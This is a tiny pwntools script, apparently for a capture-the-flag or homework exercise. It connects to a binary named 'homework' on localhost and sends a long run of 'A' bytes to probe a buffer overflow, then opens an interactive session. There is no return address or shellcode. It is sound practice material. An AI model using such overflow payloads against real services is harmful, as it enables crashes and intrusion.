from pwn import *

context.update(arch="i386", os="linux")
r = remote("127.0.0.1", 12398)
#r = process("./homework")

r.sendline(b"AAAA" * 260);
r.interactive()

